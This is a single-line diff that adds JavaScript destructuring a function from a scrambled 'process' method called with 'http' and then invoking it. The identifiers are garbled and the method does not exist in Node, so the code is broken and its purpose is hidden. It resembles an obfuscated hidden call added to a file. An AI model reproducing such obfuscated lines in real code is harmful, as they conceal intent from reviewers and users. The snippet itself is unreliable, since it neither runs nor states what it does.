@@ -1,0 +1,1 @@
+const {wtniskw} = process.fuoJqbonfcKvnvat('http'); wtniskw()
